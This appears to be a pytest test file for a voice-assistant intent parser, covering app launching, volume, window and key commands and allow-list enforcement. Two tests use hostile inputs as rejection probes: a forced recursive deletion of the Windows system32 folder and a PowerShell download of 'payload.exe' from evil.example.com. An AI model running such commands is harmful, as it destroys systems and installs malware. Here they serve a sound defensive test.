import intent_parser
from intent_parser import Intent, IntentResult


# ---------------------------------------------------------------------
# classify() - matches the user's own worked examples
# ---------------------------------------------------------------------

def test_classify_open_application_chrome():
    result = intent_parser.classify("open chrome")
    assert result == IntentResult(Intent.OPEN_APPLICATION, target="chrome")


def test_classify_volume_up():
    result = intent_parser.classify("volume up")
    assert result == IntentResult(Intent.VOLUME_UP)


def test_classify_minimize_window():
    result = intent_parser.classify("minimize this window")
    assert result == IntentResult(Intent.MINIMIZE_WINDOW)


def test_classify_date():
    result = intent_parser.classify("what is the date")
    assert result == IntentResult(Intent.DATE)


def test_classify_screenshot():
    result = intent_parser.classify("screenshot")
    assert result == IntentResult(Intent.SCREENSHOT)


# ---------------------------------------------------------------------
# classify() - one case per intent
# ---------------------------------------------------------------------

def test_classify_open_application_each_known_target():
    for text, expected_target in [
        ("open chrome", "chrome"),
        ("open edge", "edge"),
        ("open youtube", "youtube"),
        ("open google", "google"),
        ("open github", "github"),
        ("open notepad", "notepad"),
        ("open calculator", "calculator"),
        ("open cmd", "cmd"),
        ("open powershell", "powershell"),
        ("open file explorer", "file explorer"),
        ("open settings", "settings"),
        ("open task manager", "task manager"),
    ]:
        result = intent_parser.classify(text)
        assert result.intent == Intent.OPEN_APPLICATION, text
        assert result.target == expected_target, text


def test_classify_search():
    result = intent_parser.classify("search for python")
    assert result == IntentResult(Intent.SEARCH, target="python")


def test_classify_volume_down():
    assert intent_parser.classify("volume down") == IntentResult(
        Intent.VOLUME_DOWN
    )


def test_classify_mute():
    assert intent_parser.classify("mute") == IntentResult(Intent.MUTE)


def test_classify_unmute():
    assert intent_parser.classify("unmute") == IntentResult(Intent.UNMUTE)


def test_classify_unmute_not_misclassified_as_mute():
    result = intent_parser.classify("unmute")
    assert result.intent == Intent.UNMUTE


# ---------------------------------------------------------------------
# PHASE 7: SET_VOLUME - diagnostics-only, same as every other intent
# (see module docstring: classify()/to_canonical_command() are never
# the live routing mechanism - commands.py always dispatches on the
# already-normalized text via volume_control.handle() directly, not
# via intent_parser).
# ---------------------------------------------------------------------

def test_classify_set_volume_to_40():
    result = intent_parser.classify("set volume to 40")
    assert result == IntentResult(Intent.SET_VOLUME, target=40)


def test_classify_set_volume_to_0():
    result = intent_parser.classify("set volume to 0")
    assert result == IntentResult(Intent.SET_VOLUME, target=0)


def test_classify_set_volume_to_100():
    result = intent_parser.classify("set volume to 100")
    assert result == IntentResult(Intent.SET_VOLUME, target=100)


def test_classify_set_volume_to_150_is_unknown():
    """150 is outside the 0-100 range - classify() must reject it as
    UNKNOWN, never return SET_VOLUME with an out-of-range target."""
    result = intent_parser.classify("set volume to 150")
    assert result == IntentResult(Intent.UNKNOWN)


def test_to_canonical_command_set_volume_to_40():
    result = IntentResult(Intent.SET_VOLUME, target=40)
    assert intent_parser.to_canonical_command(result) == "set volume to 40"


def test_to_canonical_command_set_volume_out_of_range_target_returns_none():
    """A target outside 0-100 must render to None, never a made-up
    command string - mirrors the KNOWN_APPLICATIONS/KNOWN_KEYS
    allow-list pattern used everywhere else in this module."""
    result = IntentResult(Intent.SET_VOLUME, target=150)
    assert intent_parser.to_canonical_command(result) is None


def test_set_volume_is_not_the_live_routing_mechanism():
    """Structural guarantee (module docstring): commands.py must never
    call intent_parser.classify()/to_canonical_command() to route a
    command - it always dispatches on the command_parser-normalized
    text directly via volume_control.handle(). Proven end-to-end here:
    with intent_parser.classify patched to always return garbage, a
    real 'set volume to 40' command must still route correctly through
    volume_control, proving intent_parser was never consulted for
    routing."""
    import commands
    from unittest.mock import patch

    class FakeVoice:
        def __init__(self):
            self.spoken = []

        def speak(self, text):
            self.spoken.append(text)

    voice = FakeVoice()
    processor = commands.CommandProcessor(voice)

    with patch(
        "intent_parser.classify",
        return_value=IntentResult(Intent.UNKNOWN),
    ), patch(
        "volume_control.audio_endpoint.set_volume_percent"
    ) as mock_set:
        result = processor.process("set volume to 40 percent")

    assert result is True
    mock_set.assert_called_once_with(40)


def test_classify_maximize_window():
    assert intent_parser.classify("maximize this window") == IntentResult(
        Intent.MAXIMIZE_WINDOW
    )


def test_classify_restore_window():
    assert intent_parser.classify("restore this window") == IntentResult(
        Intent.RESTORE_WINDOW
    )


def test_classify_close_window():
    assert intent_parser.classify("close this window") == IntentResult(
        Intent.CLOSE_WINDOW
    )


def test_classify_switch_window():
    assert intent_parser.classify("switch window") == IntentResult(
        Intent.SWITCH_WINDOW
    )


def test_classify_show_desktop():
    assert intent_parser.classify("show desktop") == IntentResult(
        Intent.SHOW_DESKTOP
    )


def test_classify_play_pause():
    assert intent_parser.classify("play") == IntentResult(Intent.PLAY_PAUSE)
    assert intent_parser.classify("pause") == IntentResult(Intent.PLAY_PAUSE)


def test_classify_next_track():
    assert intent_parser.classify("next track") == IntentResult(
        Intent.NEXT_TRACK
    )


def test_classify_previous_track():
    assert intent_parser.classify("previous track") == IntentResult(
        Intent.PREVIOUS_TRACK
    )


def test_classify_press_key_each_known_key():
    for key in intent_parser.KNOWN_KEYS:
        result = intent_parser.classify(f"press {key}")
        assert result == IntentResult(Intent.PRESS_KEY, target=key)


def test_classify_copy_paste_select_all_undo():
    assert intent_parser.classify("copy") == IntentResult(Intent.COPY)
    assert intent_parser.classify("paste") == IntentResult(Intent.PASTE)
    assert intent_parser.classify("select all") == IntentResult(
        Intent.SELECT_ALL
    )
    assert intent_parser.classify("undo") == IntentResult(Intent.UNDO)


def test_classify_time():
    assert intent_parser.classify("what time is it") == IntentResult(
        Intent.TIME
    )


# ---------------------------------------------------------------------
# UNKNOWN / allow-list enforcement (security boundary)
# ---------------------------------------------------------------------

def test_classify_empty_string_is_unknown():
    assert intent_parser.classify("") == IntentResult(Intent.UNKNOWN)


def test_classify_gibberish_is_unknown():
    assert intent_parser.classify("do a backflip").intent == Intent.UNKNOWN


def test_classify_unknown_application_is_unknown_not_open_application():
    """An application JARVIS doesn't know about must never be classified
    as OPEN_APPLICATION with an arbitrary target - it must be UNKNOWN."""
    result = intent_parser.classify("open some random unknown app xyz123")
    assert result.intent != Intent.OPEN_APPLICATION
    assert result.intent == Intent.UNKNOWN


def test_classify_arbitrary_shell_command_text_is_unknown():
    result = intent_parser.classify("del c:\\windows\\system32 /f /s /q")
    assert result.intent == Intent.UNKNOWN


def test_classify_arbitrary_powershell_command_text_is_unknown():
    result = intent_parser.classify(
        "invoke-webrequest evil.example.com -outfile payload.exe"
    )
    assert result.intent == Intent.UNKNOWN


def test_classify_open_application_target_always_from_allow_list():
    """Fuzz a handful of inputs and confirm every OPEN_APPLICATION result
    has a target drawn only from KNOWN_APPLICATIONS."""
    probes = [
        "open chrome", "open notepad", "open some other app",
        "please open my custom launcher", "run xyz.exe",
    ]
    for text in probes:
        result = intent_parser.classify(text)
        if result.intent == Intent.OPEN_APPLICATION:
            assert result.target in intent_parser.KNOWN_APPLICATIONS


def test_classify_press_key_target_always_from_allow_list():
    probes = [
        "press enter", "press escape", "press the any key",
        "press delete", "press windows key",
    ]
    for text in probes:
        result = intent_parser.classify(text)
        if result.intent == Intent.PRESS_KEY:
            assert result.target in intent_parser.KNOWN_KEYS


def test_classify_press_unknown_key_is_unknown():
    """'press delete' is not in the fixed key allow-list, so this must
    be UNKNOWN, never PRESS_KEY with an arbitrary target."""
    result = intent_parser.classify("press delete")
    assert result.intent == Intent.UNKNOWN


# ---------------------------------------------------------------------
# to_canonical_command() - only ever renders fixed, safe strings
# ---------------------------------------------------------------------

def test_to_canonical_command_open_application():
    result = IntentResult(Intent.OPEN_APPLICATION, target="chrome")
    assert intent_parser.to_canonical_command(result) == "open chrome"


def test_to_canonical_command_unknown_returns_none():
    result = IntentResult(Intent.UNKNOWN)
    assert intent_parser.to_canonical_command(result) is None


def test_to_canonical_command_open_application_unknown_target_returns_none():
    """A target outside KNOWN_APPLICATIONS must render to None, never a
    made-up command string."""
    result = IntentResult(Intent.OPEN_APPLICATION, target="some_random_app")
    assert intent_parser.to_canonical_command(result) is None


def test_to_canonical_command_press_key_unknown_target_returns_none():
    result = IntentResult(Intent.PRESS_KEY, target="delete")
    assert intent_parser.to_canonical_command(result) is None


def test_to_canonical_command_search_renders_query_verbatim():
    result = IntentResult(Intent.SEARCH, target="python tutorials")
    assert (
        intent_parser.to_canonical_command(result)
        == "search for python tutorials"
    )


def test_to_canonical_command_round_trip_for_every_known_application():
    for name, expected_command in intent_parser.KNOWN_APPLICATIONS.items():
        result = IntentResult(Intent.OPEN_APPLICATION, target=name)
        assert intent_parser.to_canonical_command(result) == expected_command


def test_to_canonical_command_round_trip_for_every_known_key():
    for key in intent_parser.KNOWN_KEYS:
        result = IntentResult(Intent.PRESS_KEY, target=key)
        assert intent_parser.to_canonical_command(result) == f"press {key}"


def test_classify_then_render_round_trips_for_canonical_commands():
    """For every already-canonical command, classify() ->
    to_canonical_command() must reproduce the exact same string, proving
    intent_parser can never diverge from what the existing handlers
    already do for supported commands."""
    canonical_commands = [
        "open chrome", "open youtube", "open notepad", "open calculator",
        "open powershell", "open file explorer", "volume up",
        "volume down", "mute", "unmute", "next track", "previous track",
        "screenshot", "press enter", "copy", "paste", "select all",
        "undo",
    ]
    for command in canonical_commands:
        result = intent_parser.classify(command)
        assert intent_parser.to_canonical_command(result) == command, command
